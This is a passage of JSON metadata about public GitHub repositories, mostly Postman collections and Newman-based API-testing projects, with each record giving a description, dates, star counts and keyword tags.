docker","fork":false,"created_at":"2019-12-03T23:02:46Z","updated_at":"2019-12-15T18:58:29Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":57792300,"owner_login":"chinu4104","owner_avatar_url":"https://avatars1.githubusercontent.com/u/57792300?v=4","pulled":1,"tags":["test","auto","automat","automation","docker"]},{"id":202258652,"name":"postman-collections","full_name":"teddychan/postman-collections","description":"The list of Postman Collections, easier for engineer to import and test API.","fork":false,"created_at":"2019-08-14T02:29:24Z","updated_at":"2019-08-15T13:57:19Z","stargazers_count":1,"watchers_count":1,"forks":0,"watchers":1,"score":1,"owner_id":1013507,"owner_login":"teddychan","owner_avatar_url":"https://avatars0.githubusercontent.com/u/1013507?v=4","pulled":1,"tags":["test","list","import","easier","engine"]},{"id":249080420,"name":"trello-postman","full_name":"artisanpatel/trello-postman","description":"Postman tests for trello api","fork":false,"created_at":"2020-03-21T23:41:48Z","updated_at":"2020-03-24T00:14:14Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":55303905,"owner_login":"artisanpatel","owner_avatar_url":"https://avatars1.githubusercontent.com/u/55303905?v=4","pulled":1,"tags":["test","tests","tests ","trello"]},{"id":101752861,"name":"Postman-API-Test","full_name":"zenghaojim33/Postman-API-Test","description":null,"fork":false,"created_at":"2017-08-29T11:17:36Z","updated_at":"2017-08-29T11:17:36Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":8848084,"owner_login":"zenghaojim33","owner_avatar_url":"https://avatars2.githubusercontent.com/u/8848084?v=4","pulled":1,"tags":[]},{"id":131674773,"name":"API-Postman-Chloe-","full_name":"chloeboss/API-Postman-Chloe-","description":"Automate testing with the Collection Runner ","fork":false,"created_at":"2018-05-01T04:03:49Z","updated_at":"2018-05-23T05:06:47Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":36338702,"owner_login":"chloeboss","owner_avatar_url":"https://avatars2.githubusercontent.com/u/36338702?v=4","pulled":1,"tags":["test","testing"]},{"id":152239460,"name":"api-postman-newman","full_name":"KaushalShah1307/api-postman-newman","description":"Framework setup to test APIs, either REST or SOAP, with Postman and execute the collections using Newman, a CLI tool","fork":false,"created_at":"2018-10-09T11:29:05Z","updated_at":"2018-10-10T11:22:02Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":9022517,"owner_login":"KaushalShah1307","owner_avatar_url":"https://avatars3.githubusercontent.com/u/9022517?v=4","pulled":1,"tags":["test","collect","collection","collections","tool","setup","execute","either"]},{"id":169707984,"name":"api-postman-latest","full_name":"NayanaCV25/api-postman-latest","description":null,"fork":false,"created_at":"2019-02-08T08:58:22Z","updated_at":"2019-06-10T05:07:26Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":47409944,"owner_login":"NayanaCV25","owner_avatar_url":"https://avatars0.githubusercontent.com/u/47409944?v=4","pulled":1,"tags":[]},{"id":200505586,"name":"EducationPostmanAPI","full_name":"semalaiappan/EducationPostmanAPI","description":null,"fork":false,"created_at":"2019-08-04T14:53:11Z","updated_at":"2019-08-04T15:16:00Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":34613894,"owner_login":"semalaiappan","owner_avatar_url":"https://avatars2.githubusercontent.com/u/34613894?v=4","pulled":1,"tags":[]},{"id":123750931,"name":"dog_apitesting","full_name":"simonychuang/dog_apitesting","description":"Postman test cases for dog API","fork":false,"created_at":"2018-03-04T02:51:02Z","updated_at":"2018-03-04T02:51:02Z","stargazers_count":0,"watchers_count":0,"forks":1,"watchers":0,"score":1,"owner_id":17274713,"owner_login":"simonychuang","owner_avatar_url":"https://avatars1.githubusercontent.com/u/17274713?v=4","pulled":1,"tags":["test","case","cases"]},{"id":224109971,"name":"CI-API","full_name":"kaijack/CI-API","description":"codeigniter api test with rested/ postman","fork":false,"created_at":"2019-11-26T05:29:59Z","updated_at":"2019-11-27T04:00:56Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":51922227,"owner_login":"kaijack","owner_avatar_url":"https://avatars3.githubusercontent.com/u/51922227?v=4","pulled":1,"tags":["test"," postman","rest","code","codeigniter","rested"]},{"id":196969246,"name":"Test","full_name":"konradporeba/Test","description":"test ggithub api with postman","fork":false,"created_at":"2019-07-15T09:37:05Z","updated_at":"2019-07-15T09:37:05Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":34138284,"owner_login":"konradporeba","owner_avatar_url":"https://avatars0.githubusercontent.com/u/34138284?v=4","pulled":1,"tags":["test"," postman","github","ggithub"]},{"id":195972399,"name":"CRUD-API","full_name":"atayodele/CRUD-API","description":"How to test API'swith postman","fork":false,"created_at":"2019-07-09T09:02:35Z","updated_at":"2019-07-09T09:05:08Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":44263125,"owner_login":"atayodele","owner_avatar_url":"https://avatars2.githubusercontent.com/u/44263125?v=4","pulled":1,"tags":["test"," postman"]},{"id":182097085,"name":"Test-Api","full_name":"Angsumanroy/Test-Api","description":"Sample Api for testing in postman","fork":false,"created_at":"2019-04-18T13:54:22Z","updated_at":"2019-04-18T14:10:17Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":49455321,"owner_login":"Angsumanroy","owner_avatar_url":"https://avatars1.githubusercontent.com/u/49455321?v=4","pulled":1,"tags":["test"," postman","testing"]},{"id":179335977,"name":"API-testing","full_name":"SimerjeetWalia/API-testing","description":"Api testing using postman and restAssured","fork":false,"created_at":"2019-04-03T17:14:52Z","updated_at":"2019-04-03T18:22:50Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":46979156,"owner_login":"SimerjeetWalia","owner_avatar_url":"https://avatars3.githubusercontent.com/u/46979156?v=4","pulled":1,"tags":["test"," postman","testing","rest"]},{"id":236349082,"name":"apitest-CICD","full_name":"tarunmaini16/apitest-CICD","description":"Running API tests at Jenkins via Postman","fork":false,"created_at":"2020-01-26T17:33:51Z","updated_at":"2020-01-28T06:57:57Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":22731126,"owner_login":"tarunmaini16","owner_avatar_url":"https://avatars3.githubusercontent.com/u/22731126?v=4","pulled":1,"tags":["test","tests","tests "]},{"id":190520774,"name":"PostmanTests-for-NewWorld","full_name":"SivaPrasad186/PostmanTests-for-NewWorld","description":"Private repository for having all the postman tests for the new world API's.","fork":false,"created_at":"2019-06-06T05:38:10Z","updated_at":"2019-07-10T08:18:34Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":48505922,"owner_login":"SivaPrasad186","owner_avatar_url":"https://avatars2.githubusercontent.com/u/48505922?v=4","pulled":1,"tags":["test"," postman","repo","repos","repository","tests","tests ","postman tests","world","having"]},{"id":79717293,"name":"API-2-Postman","full_name":"OneHourTranslation/API-2-Postman","description":null,"fork":false,"created_at":"2017-01-22T12:45:56Z","updated_at":"2017-01-22T13:59:51Z","stargazers_count":1,"watchers_count":1,"forks":0,"watchers":1,"score":1,"owner_id":338564,"owner_login":"OneHourTranslation","owner_avatar_url":"https://avatars2.githubusercontent.com/u/338564?v=4","pulled":1,"tags":[]},{"id":197182846,"name":"geogrid-apis-postman","full_name":"retta-ti/geogrid-apis-postman","description":"Projeto com as APIs do GeoGrid (https://geogridmaps.com.br/) para testar usando o Postman.","fork":false,"created_at":"2019-07-16T11:41:22Z","updated_at":"2019-09-01T16:37:27Z","stargazers_count":1,"watchers_count":1,"forks":0,"watchers":1,"score":1,"owner_id":48885066,"owner_login":"retta-ti","owner_avatar_url":"https://avatars3.githubusercontent.com/u/48885066?v=4","pulled":1,"tags":["test","http","https","star","usando","maps","geogrid"]},{"id":239748214,"name":"custom-shop-api-postman","full_name":"billbeeio/custom-shop-api-postman","description":"A postman collection for testing a Billbee custom shop api implementation","fork":false,"created_at":"2020-02-11T11:42:33Z","updated_at":"2020-02-11T12:11:28Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":32762572,"owner_login":"billbeeio","owner_avatar_url":"https://avatars0.githubusercontent.com/u/32762572?v=4","pulled":1,"tags":["test"," postman","collect","collection","testing","postman collection","implement","implementation","shop","custom"]},{"id":242509054,"name":"postman_api_automation","full_name":"arjunsk/postman_api_automation","description":null,"fork":false,"created_at":"2020-02-23T12:01:26Z","updated_at":"2020-02-23T12:06:34Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":9638314,"owner_login":"arjunsk","owner_avatar_url":"https://avatars1.githubusercontent.com/u/9638314?v=4","pulled":1,"tags":[]},{"id":245438932,"name":"hack-api-postman","full_name":"hughhopkins/hack-api-postman","description":null,"fork":false,"created_at":"2020-03-06T14:22:01Z","updated_at":"2020-03-06T14:54:12Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":2920542,"owner_login":"hughhopkins","owner_avatar_url":"https://avatars3.githubusercontent.com/u/2920542?v=4","pulled":1,"tags":[]},{"id":245399581,"name":"api-sample-flask-postman","full_name":"vit-ganich/api-sample-flask-postman","description":"Flask app for API testing with Postman","fork":false,"created_at":"2020-03-06T11:13:05Z","updated_at":"2020-03-06T12:29:03Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":36228694,"owner_login":"vit-ganich","owner_avatar_url":"https://avatars3.githubusercontent.com/u/36228694?v=4","pulled":1,"tags":["test","testing"]},{"id":119142124,"name":"q-postman","full_name":"Digender/q-postman","description":"A postman like app for api testing","fork":false,"created_at":"2018-01-27T07:10:29Z","updated_at":"2018-01-27T07:10:29Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":4971901,"owner_login":"Digender","owner_avatar_url":"https://avatars3.githubusercontent.com/u/4971901?v=4","pulled":1,"tags":["test"," postman","testing","postman like"]},{"id":216732303,"name":"postman-collections","full_name":"hackoregon/postman-collections","description":"Postman Collection Exports for API testing ","fork":false,"created_at":"2019-10-22T05:45:22Z","updated_at":"2019-11-11T05:11:14Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":6343574,"owner_login":"hackoregon","owner_avatar_url":"https://avatars3.githubusercontent.com/u/6343574?v=4","pulled":1,"tags":["test","testing"]},{"id":204069671,"name":"postman-clone","full_name":"joshLazarte/postman-clone","description":"Minimal version of postman API endpoint tester","fork":false,"created_at":"2019-08-23T21:03:48Z","updated_at":"2019-08-29T02:43:56Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":44149542,"owner_login":"joshLazarte","owner_avatar_url":"https://avatars1.githubusercontent.com/u/44149542?v=4","pulled":1,"tags":["test"," postman","endpoint","version","tester"]},{"id":199668354,"name":"rest_api_teste","full_name":"Joseeptessele/rest_api_teste","description":"rest api com spring, testada com postman","fork":false,"created_at":"2019-07-30T14:30:34Z","updated_at":"2019-07-30T15:54:14Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":37282140,"owner_login":"Joseeptessele","owner_avatar_url":"https://avatars1.githubusercontent.com/u/37282140?v=4","pulled":1,"tags":["test"," postman","rest","spring","rest api","tada","testada"]},{"id":203851519,"name":"Message-board-API","full_name":"GarlandLai/Message-board-API","description":"Practice creating API and testing through postman","fork":false,"created_at":"2019-08-22T18:31:17Z","updated_at":"2019-08-22T21:32:33Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":48932602,"owner_login":"GarlandLai","owner_avatar_url":"https://avatars2.githubusercontent.com/u/48932602?v=4","pulled":1,"tags":["test"," postman","testing","creating"]},{"id":39001898,"name":"mobbr-api-tests","full_name":"mobbr/mobbr-api-tests","description":"POSTMAN-scripts for API endpoint testing.","fork":false,"created_at":"2015-07-13T09:01:00Z","updated_at":"2015-07-13T09:01:00Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":710804,"owner_login":"mobbr","owner_avatar_url":"https://avatars2.githubusercontent.com/u/710804?v=4","pulled":1,"tags":["test","testing","script","endpoint","scripts"]},{"id":180453250,"name":"fhnw-wodss-apitests","full_name":"ncocquio/fhnw-wodss-apitests","description":"Postman collection to test wodss FS19 API","fork":false,"created_at":"2019-04-09T21:38:15Z","updated_at":"2019-04-27T14:52:47Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":15085880,"owner_login":"ncocquio","owner_avatar_url":"https://avatars3.githubusercontent.com/u/15085880?v=4","pulled":1,"tags":["test","collect","collection","wodss"]},{"id":94966256,"name":"APIs-Automation-test","full_name":"shantu/APIs-Automation-test","description":"Write automated tests for APIs using Postman","fork":false,"created_at":"2017-06-21T05:28:58Z","updated_at":"2017-06-21T05:28:58Z","stargazers_count":0,"watchers_count":0,"forks":1,"watchers":0,"score":1,"owner_id":2716503,"owner_login":"shantu","owner_avatar_url":"https://avatars0.githubusercontent.com/u/2716503?v=4","pulled":1,"tags":["test","tests","tests ","auto","automat","automate","automated"]},{"id":124559541,"name":"dkan-postman","full_name":"dafeder/dkan-postman","description":"Postman collection for testing DKAN APIs","fork":false,"created_at":"2018-03-09T15:40:47Z","updated_at":"2018-03-09T15:40:47Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":309671,"owner_login":"dafeder","owner_avatar_url":"https://avatars1.githubusercontent.com/u/309671?v=4","pulled":1,"tags":["test","collect","collection","testing"]},{"id":119252926,"name":"Qantas_API_Project","full_name":"ArpithaArun/Qantas_API_Project","description":"Automation regression test-cases using Postman","fork":false,"created_at":"2018-01-28T11:39:26Z","updated_at":"2018-01-28T11:39:26Z","stargazers_count":0,"watchers_count":0,"forks":1,"watchers":0,"score":1,"owner_id":27986740,"owner_login":"ArpithaArun","owner_avatar_url":"https://avatars1.githubusercontent.com/u/27986740?v=4","pulled":1,"tags":["test","case","cases","regression"]},{"id":230977523,"name":"k6-from-postman","full_name":"nkeenan38/k6-from-postman","description":"Generates K6 tests in typescript from postman collections","fork":false,"created_at":"2019-12-30T20:45:20Z","updated_at":"2020-01-20T13:41:24Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":25674476,"owner_login":"nkeenan38","owner_avatar_url":"https://avatars2.githubusercontent.com/u/25674476?v=4","pulled":1,"tags":["test"," postman","collect","collection","collections","postman collection","tests","script","tests ","postman collections","type","types","typescript"]},{"id":152200009,"name":"postman-tests-jenkins-newman","full_name":"komalh1/postman-tests-jenkins-newman","description":"test the postman collection with Newman on Jenkins","fork":false,"created_at":"2018-10-09T06:36:19Z","updated_at":"2018-10-09T06:36:41Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":35667407,"owner_login":"komalh1","owner_avatar_url":"https://avatars1.githubusercontent.com/u/35667407?v=4","pulled":1,"tags":["test"," postman","collect","collection","postman collection"]},{"id":159636679,"name":"postmanapitest","full_name":"vikrantmulani/postmanapitest","description":"This is a very basic Postman API of json server test with a collection and environment file.","fork":false,"created_at":"2018-11-29T08:58:20Z","updated_at":"2018-11-29T09:27:01Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":29890738,"owner_login":"vikrantmulani","owner_avatar_url":"https://avatars0.githubusercontent.com/u/29890738?v=4","pulled":1,"tags":["test","collect","collection","file","server","json","environment","very","json server"]},{"id":203807949,"name":"share-your-stuff-postman","full_name":"shared-economy/share-your-stuff-postman","description":"This is the postman collection to test the API.","fork":false,"created_at":"2019-08-22T14:07:08Z","updated_at":"2020-02-15T12:48:05Z","stargazers_count":1,"watchers_count":1,"forks":0,"watchers":1,"score":1,"owner_id":54286012,"owner_login":"shared-economy","owner_avatar_url":"https://avatars1.githubusercontent.com/u/54286012?v=4","pulled":1,"tags":["test"," postman","collect","collection","postman collection"]},{"id":192481648,"name":"postman-webex-meetings-xml","full_name":"CiscoDevNet/postman-webex-meetings-xml","description":"Webex Meetings XML API - Postman collection for reference and testing","fork":false,"created_at":"2019-06-18T06:44:22Z","updated_at":"2020-03-13T20:31:55Z","stargazers_count":1,"watchers_count":1,"forks":1,"watchers":1,"score":1,"owner_id":8827988,"owner_login":"CiscoDevNet","owner_avatar_url":"https://avatars2.githubusercontent.com/u/8827988?v=4","pulled":1,"tags":["test","collect","collection","testing","reference"]},{"id":216602709,"name":"tsr-postman-tests","full_name":"margiani/tsr-postman-tests","description":"Postman test collection for tsrpay.com client API testing","fork":false,"created_at":"2019-10-21T15:30:27Z","updated_at":"2019-10-21T15:36:38Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":15003884,"owner_login":"margiani","owner_avatar_url":"https://avatars0.githubusercontent.com/u/15003884?v=4","pulled":1,"tags":["test","collect","collection","testing","client"]},{"id":123305512,"name":"Postman-Collection-for-VMware-Fusion-API-1.0","full_name":"vmwarecode/Postman-Collection-for-VMware-Fusion-API-1.0","description":null,"fork":false,"created_at":"2018-02-28T15:40:14Z","updated_at":"2018-02-28T15:40:14Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":12194195,"owner_login":"vmwarecode","owner_avatar_url":"https://avatars1.githubusercontent.com/u/12194195?v=4","pulled":1,"tags":[]},{"id":135479462,"name":"import_postman","full_name":"MarioRuiz/import_postman","description":"This gem imports a postman collection to be used as RequestHash object and creates tests","fork":false,"created_at":"2018-05-30T18:00:33Z","updated_at":"2018-12-05T10:30:44Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":459564,"owner_login":"MarioRuiz","owner_avatar_url":"https://avatars3.githubusercontent.com/u/459564?v=4","pulled":1,"tags":["test"," postman","collect","collection","create","postman collection","tests","import","object","creates","imports"]},{"id":241260117,"name":"eth-postman","full_name":"OpenBazaar/eth-postman","description":"Postman collection to QA test the openbazaar-go API (ETH integration)","fork":false,"created_at":"2020-02-18T03:05:47Z","updated_at":"2020-03-06T11:27:34Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":7438770,"owner_login":"OpenBazaar","owner_avatar_url":"https://avatars0.githubusercontent.com/u/7438770?v=4","pulled":1,"tags":["test","collect","collection","integration","open"]},{"id":167618599,"name":"postman-newman-circleci","full_name":"mCzolko/postman-newman-circleci","description":"Just a test of Postman collection run by Newman on CircleCI","fork":false,"created_at":"2019-01-25T21:49:12Z","updated_at":"2019-01-25T22:03:19Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":1011500,"owner_login":"mCzolko","owner_avatar_url":"https://avatars1.githubusercontent.com/u/1011500?v=4","pulled":1,"tags":["test","collect","collection"]},{"id":206338892,"name":"BBDN-Collab-Postman-REST","full_name":"blackboard/BBDN-Collab-Postman-REST","description":"This repository contains a postman collection for testing the Collaborate REST APIs.","fork":false,"created_at":"2019-09-04T14:28:49Z","updated_at":"2019-09-04T14:42:15Z","stargazers_count":0,"watchers_count":0,"forks":1,"watchers":0,"score":1,"owner_id":1282638,"owner_login":"blackboard","owner_avatar_url":"https://avatars2.githubusercontent.com/u/1282638?v=4","pulled":1,"tags":["test"," postman","collect","collection","repo","testing","postman collection","repos","repository","contain"]},{"id":105566425,"name":"postman-soatest","full_name":"parasoft/postman-soatest","description":"Parses the Postman v2 collection.json file and uses the Parasoft SOAtest REST API to create SOAtest .tst's.","fork":false,"created_at":"2017-10-02T17:57:40Z","updated_at":"2017-10-02T17:58:47Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":18577356,"owner_login":"parasoft","owner_avatar_url":"https://avatars0.githubusercontent.com/u/18577356?v=4","pulled":1,"tags":["test","collect","collection","create","file","json","uses"]},{"id":117267246,"name":"postman_newman_example","full_name":"barbaracabral/postman_newman_example","description":"Exemplo de Testes Automatizados exportando as collections com testes do postman e executando com o Newman","fork":false,"created_at":"2018-01-12T17:05:22Z","updated_at":"2018-01-12T17:05:22Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":12861305,"owner_login":"barbaracabral","owner_avatar_url":"https://avatars3.githubusercontent.com/u/12861305?v=4","pulled":1,"tags":["test"," postman","collect","collection","collections","export","testes"]},{"id":195776640,"name":"Postman-Load-Testing-App","full_name":"bnaddison/Postman-Load-Testing-App","description":"An open source and simple application for load testing with Postman collections using Newman.","fork":false,"created_at":"2019-07-08T09:08:41Z","updated_at":"2019-07-10T23:01:31Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":42801329,"owner_login":"bnaddison","owner_avatar_url":"https://avatars3.githubusercontent.com/u/42801329?v=4","pulled":1,"tags":["test","collect","collection","collections","testing","application","load","source","open"]},{"id":213912287,"name":"ScorpioBroker-Postman","full_name":"michaeI-s/ScorpioBroker-Postman","description":"Postman collection for testing implementation status of the Scorpio NGSI-LD Broker","fork":false,"created_at":"2019-10-09T12:26:24Z","updated_at":"2019-12-13T01:02:03Z","stargazers_count":1,"watchers_count":1,"forks":0,"watchers":1,"score":1,"owner_id":54945591,"owner_login":"michaeI-s","owner_avatar_url":"https://avatars3.githubusercontent.com/u/54945591?v=4","pulled":1,"tags":["test","collect","collection","testing","implement","stat","implementation","status"]},{"id":238942585,"name":"postman-newman-gitlab","full_name":"shcarroll/postman-newman-gitlab","description":"Example repo containing Postman collections of API tests, Newman command line runner for these and a Gitlab CI file","fork":false,"created_at":"2020-02-07T14:23:23Z","updated_at":"2020-02-10T09:59:16Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":47427411,"owner_login":"shcarroll","owner_avatar_url":"https://avatars3.githubusercontent.com/u/47427411?v=4","pulled":1,"tags":["test","collect","collection","collections","repo","file","tests","contain","line","runner","command","command line","containing"]},{"id":127412433,"name":"LoadTesting.withpostmanis.fun","full_name":"Ayushverma8/LoadTesting.withpostmanis.fun","description":"Helping developers to convert Postman collection to Load testing tools.","fork":false,"created_at":"2018-03-30T09:57:25Z","updated_at":"2018-10-04T10:58:29Z","stargazers_count":0,"watchers_count":0,"forks":1,"watchers":0,"score":1,"owner_id":15349623,"owner_login":"Ayushverma8","owner_avatar_url":"https://avatars0.githubusercontent.com/u/15349623?v=4","pulled":1,"tags":["test","collect","collection","testing","tool","develop","convert","tools","developer","developers"]},{"id":191379250,"name":"Api_TestingFramework","full_name":"sunnyCN34/Api_TestingFramework","description":"Automated testing of API endpoint using postman collections ","fork":false,"created_at":"2019-06-11T13:39:00Z","updated_at":"2019-06-11T13:42:00Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":29710912,"owner_login":"sunnyCN34","owner_avatar_url":"https://avatars2.githubusercontent.com/u/29710912?v=4","pulled":1,"tags":["test"," postman","collect","collection","collections","testing","postman collection","endpoint","postman collections"]},{"id":201471857,"name":"PostmanCollection","full_name":"AndreyMaydanyuk/PostmanCollection","description":"repository for testing with postman","fork":false,"created_at":"2019-08-09T13:23:14Z","updated_at":"2019-08-09T15:04:18Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":53942844,"owner_login":"AndreyMaydanyuk","owner_avatar_url":"https://avatars3.githubusercontent.com/u/53942844?v=4","pulled":1,"tags":["test"," postman","repo","testing","repos","repository"]},{"id":241825061,"name":"postmanCollection","full_name":"SumSubstance/postmanCollection","description":null,"fork":false,"created_at":"2020-02-20T07:54:57Z","updated_at":"2020-02-20T08:01:41Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":46716545,"owner_login":"SumSubstance","owner_avatar_url":"https://avatars0.githubusercontent.com/u/46716545?v=4","pulled":1,"tags":[]},{"id":219198694,"name":"postmanCollections","full_name":"shanakaweerasinghe/postmanCollections","description":null,"fork":false,"created_at":"2019-11-02T18:47:46Z","updated_at":"2019-11-08T19:02:19Z","stargazers_count":0,"watchers_count":0,"forks":1,"watchers":0,"score":1,"owner_id":22147070,"owner_login":"shanakaweerasinghe","owner_avatar_url":"https://avatars1.githubusercontent.com/u/22147070?v=4","pulled":1,"tags":[]},{"id":86394337,"name":"postmanCollections","full_name":"Vijayabaskar03/postmanCollections","description":null,"fork":false,"created_at":"2017-03-27T23:37:14Z","updated_at":"2017-03-27T23:37:14Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":24304928,"owner_login":"Vijayabaskar03","owner_avatar_url":"https://avatars1.githubusercontent.com/u/24304928?v=4","pulled":1,"tags":[]},{"id":75900843,"name":"edm-postman-collections","full_name":"mytardis/edm-postman-collections","description":"Postman collections for testing","fork":false,"created_at":"2016-12-08T03:51:29Z","updated_at":"2016-12-08T03:51:29Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":1234844,"owner_login":"mytardis","owner_avatar_url":"https://avatars0.githubusercontent.com/u/1234844?v=4","pulled":1,"tags":["test","collect","collection","collections","testing"]},{"id":145001355,"name":"postman-collections","full_name":"jaxxstone/postman-collections","description":"copied from /grantorchard for testing vRA automation","fork":false,"created_at":"2018-08-16T14:44:24Z","updated_at":"2018-08-16T14:47:13Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":15974596,"owner_login":"jaxxstone","owner_avatar_url":"https://avatars3.githubusercontent.com/u/15974596?v=4","pulled":1,"tags":["test","testing","auto","automat","automation","grant","copied"]},{"id":159285492,"name":"Postman-Collection","full_name":"DhrutiShahSparkle/Postman-Collection","description":null,"fork":false,"created_at":"2018-11-27T06:14:52Z","updated_at":"2018-11-27T06:25:57Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":45381904,"owner_login":"DhrutiShahSparkle","owner_avatar_url":"https://avatars3.githubusercontent.com/u/45381904?v=4","pulled":1,"tags":[]},{"id":205661750,"name":"postman_collection","full_name":"AndriiL/postman_collection","description":null,"fork":false,"created_at":"2019-09-01T10:35:37Z","updated_at":"2019-09-01T10:47:17Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":24550689,"owner_login":"AndriiL","owner_avatar_url":"https://avatars0.githubusercontent.com/u/24550689?v=4","pulled":1,"tags":[]},{"id":235199266,"name":"Postman_Collection","full_name":"TrosinaM/Postman_Collection","description":null,"fork":false,"created_at":"2020-01-20T21:06:44Z","updated_at":"2020-01-21T16:03:03Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":18024838,"owner_login":"TrosinaM","owner_avatar_url":"https://avatars2.githubusercontent.com/u/18024838?v=4","pulled":1,"tags":[]},{"id":227811708,"name":"kabassu-postman-collections","full_name":"Kabassu/kabassu-postman-collections","description":"Kabassu tests in Postman","fork":false,"created_at":"2019-12-13T10:12:41Z","updated_at":"2019-12-13T13:12:44Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":35780171,"owner_login":"Kabassu","owner_avatar_url":"https://avatars3.githubusercontent.com/u/35780171?v=4","pulled":1,"tags":["test","tests","tests "]},{"id":99602889,"name":"Postman-Collection","full_name":"udemy-testuser7/Postman-Collection","description":"This is a test postman collection repository","fork":false,"created_at":"2017-08-07T17:28:40Z","updated_at":"2017-08-07T17:28:40Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":30807214,"owner_login":"udemy-testuser7","owner_avatar_url":"https://avatars1.githubusercontent.com/u/30807214?v=4","pulled":1,"tags":["test"," postman","collect","collection","repo","postman collection","repos","repository"]},{"id":99305661,"name":"Postman-Collections","full_name":"shardool1979/Postman-Collections","description":"Postman collection for the APIs and Endpoints that we come across and test ","fork":false,"created_at":"2017-08-04T05:17:05Z","updated_at":"2017-08-04T05:17:05Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":6775002,"owner_login":"shardool1979","owner_avatar_url":"https://avatars0.githubusercontent.com/u/6775002?v=4","pulled":1,"tags":["test","collect","collection","points","across"]},{"id":250253240,"name":"Postman-request-collection-dummy-","full_name":"Story-TellerX/Postman-request-collection-dummy-","description":"This is first performance of my REST testing with Postman","fork":false,"created_at":"2020-03-26T12:32:06Z","updated_at":"2020-03-26T12:36:42Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":61885326,"owner_login":"Story-TellerX","owner_avatar_url":"https://avatars2.githubusercontent.com/u/61885326?v=4","pulled":1,"tags":["test","testing","form","perform","performance"]},{"id":250647911,"name":"bwaf-postman-collections","full_name":"bwolmarans/bwaf-postman-collections","description":null,"fork":false,"created_at":"2020-03-27T21:07:50Z","updated_at":"2020-03-27T21:09:48Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":4404271,"owner_login":"bwolmarans","owner_avatar_url":"https://avatars0.githubusercontent.com/u/4404271?v=4","pulled":1,"tags":[]},{"id":136849630,"name":"postman-collection-omdb","full_name":"profedsoncruz/postman-collection-omdb","description":"Collection criada no Postman para aula de testes de API usando o 